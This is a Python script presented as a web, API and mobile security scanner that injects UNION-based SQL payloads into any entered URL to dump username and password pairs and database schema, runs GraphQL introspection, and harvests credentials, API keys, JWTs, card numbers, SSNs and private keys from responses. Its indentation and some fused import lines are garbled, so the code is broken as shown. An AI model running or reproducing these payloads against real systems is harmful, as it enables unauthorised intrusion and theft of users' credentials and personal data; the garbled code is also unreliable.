#!/usr/bin/env python3
import requests
import re
import json
import os
import html
import socket
import ssl
from urllib.parse import urlparse
from urllib3.exceptions import InsecureRequestWarning
import warnings
from colorama import Fore, Style, initinit(autoreset=True)
warnings.filterwarnings("ignore", category=InsecureRequestWarning)class AdvancedSecurityScanner:
    def __init__(self):
        self.REPORT_DIR = "security_scan_results"
        self.tested_target = ""
        self.results = {
            "credentials": [],
            "emails": [],
            "database_info": [],
            "tables": [],
            "columns": [],
            "api_endpoints": [],
            "mobile_data": [],
            "errors": []
        }

    # Advanced configurations
    self.STRICT_MODE = True
    self.VERBOSE = False
    self.TIMEOUT = 15
    self.MOBILE_APP_PATHS = [
        '/android/', '/ios/', '/mobile/', '/api/', '/v1/', '/v2/',
        '/graphql', '/rest/', '/oauth/', '/auth/', '/googleapis/'
    ]
    
    # Enhanced patterns
    self.patterns = {
        "credential": re.compile(
            r'(?i)(?P<user>[a-z0-9_\-\.]+@[a-z0-9\-\.]+\.[a-z]{2,6}|[a-z0-9_\-]{3,20})[:=](?P<pass>[^\s\'\"<>]{8,64})'
        ),
        "email": re.compile(
            r'\b[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,6}\b'
        ),
        "db_metadata": re.compile(
            r'(?i)(database|db|schema|table|column)\s*[:=]\s*[\'"]?([a-z0-9_\-]+)[\'"]?',
            re.IGNORECASE
        ),
        "api_key": re.compile(
            r'(?i)(api[_-]?key|access[_-]?token|auth[_-]?token)[\s:=]+[\'"]?([a-z0-9_\-]{20,60})[\'"]?'
        ),
        "jwt_token": re.compile(
            r'eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+'
        ),
        "mobile_data": re.compile(
            r'(?i)(bundle[_-]id|package|app[_-]id|ios|android|google[_-]play|app[_-]store)[\s:=]+[\'"]?([a-z0-9_\-\.]+)[\'"]?'
        ),
        "endpoint": re.compile(
            r'(?i)(https?://[a-z0-9_\-\.]+(/[a-z0-9_\-\.]+)+)\b'
        ),
        "html_tags": re.compile(r'<[^>]+>'),
        "scripts": re.compile(r'<script.*?>.*?</script>', re.DOTALL|re.IGNORECASE),
        "styles": re.compile(r'<style.*?>.*?</style>', re.DOTALL|re.IGNORECASE),
        "css_js": re.compile(
            r'(\{[^}]*\}|\([^)]*\)|\[[^]]*\]|;|:\s*[^;]*;|\b(var|let|const|function|class|import|export)\b)'
        )
    }

def clean_content(self, content):
    """Remove HTML, CSS, JS and decode HTML entities"""
    content = self.patterns["scripts"].sub('', content)
    content = self.patterns["styles"].sub('', content)
    content = self.patterns["html_tags"].sub('', content)
    content = self.patterns["css_js"].sub('', content)
    content = html.unescape(content)
    return content

def is_valid_credential(self, credential):
    """Rigorous credential validation"""
    if not credential or ':' not in credential:
        return False
        
    user, password = credential.split(':', 1)
    
    if not 3 <= len(user) <= 50:
        return False
        
    if len(password) < 8:
        return False
        
    false_positives = [
        'http:', 'https:', 'data:', 'url(', 'var ', 'function ',
        'return ', 'import ', 'export ', 'class ', 'xmlns:', 'xml:'
    ]
    
    if any(fp in credential.lower() for fp in false_positives):
        return False
        
    return True

def scan_web(self, url):
    """Scan web applications for SQLi vulnerabilities"""
    print(f"\n{Fore.CYAN}[+] Starting web scan: {Style.BRIGHT}{url}{Style.NORMAL}")
    
    payload_groups = {
        "credentials": [
            "' UNION SELECT null,concat(username,0x3a,password),null FROM users-- -",
            "' UNION SELECT null,concat(email,0x3a,password),null FROM accounts-- -"
        ],
        "metadata": [
            "' UNION SELECT null,concat('DB:',database()),null-- -",
            "' UNION SELECT null,group_concat(table_name),null FROM information_schema.tables WHERE table_schema=database()-- -",
            "' UNION SELECT null,group_concat(column_name),null FROM information_schema.columns WHERE table_schema=database()-- -"
        ],
        "data": [
            "' UNION SELECT null,concat(table_name,0x3a,column_name),null FROM information_schema.columns WHERE table_schema=database()-- -"
        ]
    }
    
    for group, payloads in payload_groups.items():
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                response = requests.get(
                    test_url,
                    timeout=self.TIMEOUT,
                    verify=False,
                    headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                )
                
                if self.VERBOSE:
                    print(f"{Fore.MAGENTA}[DEBUG] Testing payload: {payload}")
                
                content = self.clean_content(response.text)
                
                if group == "credentials":
                    self.process_credentials(content)
                elif group == "metadata":
                    self.process_metadata(content)
                elif group == "data":
                    self.process_data(content)
                    
            except Exception as e:
                error_msg = f"Error with payload {payload[:20]}...: {str(e)}"
                self.results["errors"].append(error_msg)
                if self.VERBOSE:
                    print(f"{Fore.YELLOW}  [-] {error_msg}")
                continue

def scan_api(self, base_url):
    """Scan API endpoints for vulnerabilities"""
    print(f"\n{Fore.BLUE}[+] Starting API scan: {Style.BRIGHT}{base_url}{Style.NORMAL}")
    
    # Common API endpoints to test
    endpoints = [
        '/users', '/auth', '/login', '/token', '/admin', '/config',
        '/database', '/query', '/search', '/graphql', '/rest'
    ]
    
    for endpoint in endpoints:
        try:
            url = f"{base_url.rstrip('/')}{endpoint}"
            response = requests.get(
                url,
                timeout=self.TIMEOUT,
                verify=False,
                headers={'User-Agent': 'API-Scanner/1.0'}
            )
            
            content = response.text
            self.process_api_content(content, url)
            
            # Check for GraphQL endpoints
            if 'graphql' in endpoint.lower():
                self.test_graphql(url)
                
        except Exception as e:
            error_msg = f"API scan error at {endpoint}: {str(e)}"
            self.results["errors"].append(error_msg)
            if self.VERBOSE:
                print(f"{Fore.YELLOW}  [-] {error_msg}")

def test_graphql(self, url):
    """Test GraphQL endpoints for information disclosure"""
    try:
        introspection_query = {
            "query": """
            query IntrospectionQuery {
                __schema {
                    queryType { name }
                    mutationType { name }
                    subscriptionType { name }
                    types {
                        ...FullType
                    }
                    directives {
                        name
                        description
                        locations
                        args {
                            ...InputValue
                        }
                    }
                }
            }
            
            fragment FullType on __Type {
                kind
                name
                description
                fields(includeDeprecated: true) {
                    name
                    description
                    args {
                        ...InputValue
                    }
                    type {
                        ...TypeRef
                    }
                    isDeprecated
                    deprecationReason
                }
                inputFields {
                    ...InputValue
                }
                interfaces {
                    ...TypeRef
                }
                enumValues(includeDeprecated: true) {
                    name
                    description
                    isDeprecated
                    deprecationReason
                }
                possibleTypes {
                    ...TypeRef
                }
            }
            
            fragment InputValue on __InputValue {
                name
                description
                type { ...TypeRef }
                defaultValue
            }
            
            fragment TypeRef on __Type {
                kind
                name
                ofType {
                    kind
                    name
                    ofType {
                        kind
                        name
                        ofType {
                            kind
                            name
                            ofType {
                                kind
                                name
                                ofType {
                                    kind
                                    name
                                    ofType {
                                        kind
                                        name
                                        ofType {
                                            kind
                                            name
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            """
        }
        
        response = requests.post(
            url,
            json=introspection_query,
            timeout=self.TIMEOUT,
            verify=False
        )
        
        if response.status_code == 200 and 'application/json' in response.headers.get('Content-Type', ''):
            data = response.json()
            if 'data' in data and '__schema' in data['data']:
                self.results["api_endpoints"].append({
                    "url": url,
                    "type": "GraphQL",
                    "schema": "Disclosed through introspection"
                })
                print(f"{Fore.RED}  [!] GraphQL introspection enabled at {url}")
                
    except Exception as e:
        if self.VERBOSE:
            print(f"{Fore.YELLOW}  [-] GraphQL test error: {str(e)}")

def scan_mobile_app(self, host):
    """Scan mobile app backend or API endpoints"""
    print(f"\n{Fore.GREEN}[+] Starting mobile app scan: {Style.BRIGHT}{host}{Style.NORMAL}")
    
    # Test common mobile API paths
    for path in self.MOBILE_APP_PATHS:
        try:
            url = f"{host.rstrip('/')}{path}"
            response = requests.get(
                url,
                timeout=self.TIMEOUT,
                verify=False,
                headers={
                    'User-Agent': 'Mobile-App-Scanner/1.0',
                    'X-Requested-With': 'com.example.app'
                }
            )
            
            content = response.text
            self.process_mobile_content(content, url)
            
        except Exception as e:
            error_msg = f"Mobile scan error at {path}: {str(e)}"
            self.results["errors"].append(error_msg)
            if self.VERBOSE:
                print(f"{Fore.YELLOW}  [-] {error_msg}")

def process_credentials(self, content):
    """Process and validate found credentials"""
    for match in self.patterns["credential"].finditer(content):
        cred = f"{match.group('user')}:{match.group('pass')}"
        if self.is_valid_credential(cred):
            self.results["credentials"].append(cred)
            print(f"{Fore.RED}  [!] Valid credential: {Fore.YELLOW}{cred}")
    
    emails = set(self.patterns["email"].findall(content))
    for email in emails:
        if not any(x in email.lower() for x in ['example.com', 'domain.com', 'test.com']):
            self.results["emails"].append(email)
            print(f"{Fore.BLUE}  [*] Valid email: {Fore.CYAN}{email}")

def process_metadata(self, content):
    """Process database metadata"""
    if 'information_schema' in content.lower():
        if 'table_name' in content.lower():
            tables = set(re.findall(r'\b[a-z0-9_]+\b', content.lower()))
            self.results["tables"].extend(tables)
            print(f"{Fore.GREEN}  [+] Tables identified: {Fore.WHITE}{', '.join(tables)}")
        
        if 'column_name' in content.lower():
            columns = set(re.findall(r'\b[a-z0-9_]+\b', content.lower()))
            self.results["columns"].extend(columns)
            print(f"{Fore.GREEN}  [+] Columns identified: {Fore.WHITE}{', '.join(columns)}")
        
        if 'database()' in content.lower():
            db_match = re.search(r'database\(\)\s*=\s*[\'"]?([a-z0-9_]+)', content.lower())
            if db_match:
                db_name = db_match.group(1)
                self.results["database_info"].append(f"Database: {db_name}")
                print(f"{Fore.GREEN}  [+] Database: {Fore.WHITE}{db_name}")

def process_data(self, content):
    """Process sensitive data"""
    sensitive_patterns = {
        "credit_card": r'\b(?:\d[ -]*?){13,16}\b',
        "ssn": r'\b\d{3}[ -]?\d{2}[ -]?\d{4}\b',
        "private_keys": r'-----BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY-----'
    }
    
    for data_type, pattern in sensitive_patterns.items():
        matches = re.findall(pattern, content)
        if matches:
            print(f"{Fore.MAGENTA}  [>] Possible {data_type.replace('_', ' ')} found")
            self.results["database_info"].extend(matches)

def process_api_content(self, content, url):
    """Process API responses for sensitive information"""
    # Check for API keys and tokens
    api_keys = set(self.patterns["api_key"].findall(content))
    for _, key in api_keys:
        if len(key) > 20:  # Basic validation for API keys
            self.results["credentials"].append(f"API_KEY:{key}")
            print(f"{Fore.RED}  [!] API key found: {Fore.YELLOW}{key[:10]}...")
    
    # Check for JWT tokens
    jwt_tokens = set(self.patterns["jwt_token"].findall(content))
    for token in jwt_tokens:
        self.results["credentials"].append(f"JWT_TOKEN:{token[:50]}...")
        print(f"{Fore.RED}  [!] JWT token found: {Fore.YELLOW}{token[:20]}...")
    
    # Identify endpoints
    endpoints = set(self.patterns["endpoint"].findall(content))
    for endpoint in endpoints:
        if urlparse(endpoint).netloc:  # Only full URLs
            self.results["api_endpoints"].append(endpoint)
            print(f"{Fore.BLUE}  [*] API endpoint discovered: {Fore.CYAN}{endpoint}")

def process_mobile_content(self, content, url):
    """Process mobile app responses"""
    # Check for mobile app identifiers
    mobile_data = set(self.patterns["mobile_data"].findall(content))
    for _, value in mobile_data:
        self.results["mobile_data"].append(f"{value}")
        print(f"{Fore.GREEN}  [+] Mobile identifier: {Fore.WHITE}{value}")
    
    # Process any credentials or sensitive data
    self.process_credentials(content)
    self.process_api_content(content, url)

def generate_report(self):
    """Generate detailed reports in multiple formats"""
    os.makedirs(self.REPORT_DIR, exist_ok=True)
    
    # Remove duplicates
    for key in self.results:
        if isinstance(self.results[key], list):
            self.results[key] = list(set(self.results[key]))
    
    # Full JSON report
    with open(f"{self.REPORT_DIR}/full_report.json", "w") as f:
        json.dump({
            "target": self.tested_target,
            "results": self.results,
            "stats": {
                "credentials_found": len(self.results["credentials"]),
                "emails_found": len(self.results["emails"]),
                "tables_found": len(self.results["tables"]),
                "columns_found": len(self.results["columns"]),
                "api_endpoints_found": len(self.results["api_endpoints"]),
                "mobile_data_found": len(self.results["mobile_data"])
            }
        }, f, indent=2, ensure_ascii=False)
    
    # Executive summary
    with open(f"{self.REPORT_DIR}/executive_summary.txt", "w") as f:
        f.write("=== Security Vulnerability Report ===\n\n")
        f.write(f"Target: {self.tested_target}\n\n")
        
        f.write("=== Results Summary ===\n")
        f.write(f"- Credentials compromised: {len(self.results['credentials'])}\n")
        f.write(f"- Emails exposed: {len(self.results['emails'])}\n")
        f.write(f"- Database tables identified: {len(self.results['tables'])}\n")
        f.write(f"- Database columns identified: {len(self.results['columns'])}\n")
        f.write(f"- API endpoints discovered: {len(self.results['api_endpoints'])}\n")
        f.write(f"- Mobile app data found: {len(self.results['mobile_data'])}\n")
        
        if self.results["errors"]:
            f.write("\n=== Errors Occurred ===\n")
            for error in self.results["errors"]:
                f.write(f"- {error}\n")
        
        f.write("\n=== Recommendations ===\n")
        recommendations = [
            "1. Implement proper authentication and authorization mechanisms",
            "2. Use parameterized queries to prevent SQL injection",
            "3. Disable unnecessary API endpoints and features",
            "4. Implement rate limiting and API key rotation",
            "5. Disable GraphQL introspection in production",
            "6. Encrypt sensitive data in transit and at rest",
            "7. Conduct regular security audits and penetration tests",
            "8. Implement proper error handling without sensitive data leakage",
            "9. Use certificate pinning for mobile apps",
            "10. Follow OWASP API Security Top 10 guidelines"
        ]
        f.write('\n'.join(recommendations))

if __name__ == "__main__":
    scanner = AdvancedSecurityScanner()

print(f"\n{Fore.RED}{Style.BRIGHT}=== Advanced Security Scanner ===")
print(f"{Fore.YELLOW}Version 3.0 - Web/API/Mobile Scanner{Style.NORMAL}\n")

target = input(f"{Fore.WHITE}[*] Enter target (URL, API endpoint, or mobile backend): ").strip()
scanner.tested_target = target

# Determine scan type based on input
if any(x in target.lower() for x in ['api', 'graphql', 'rest', 'googleapis']):
    scanner.scan_api(target)
elif any(x in target.lower() for x in ['android', 'ios', 'mobile']):
    scanner.scan_mobile_app(target)
else:
    if not target.startswith(('http://', 'https://')):
        target = f"http://{target}"
    scanner.scan_web(target)

scanner.generate_report()

print(f"\n{Fore.GREEN}{Style.BRIGHT}[+] Scan completed successfully!")
print(f"{Fore.CYAN}[*] Reports generated in:")
print(f"  - {scanner.REPORT_DIR}/full_report.json")
print(f"  - {scanner.REPORT_DIR}/executive_summary.txt")

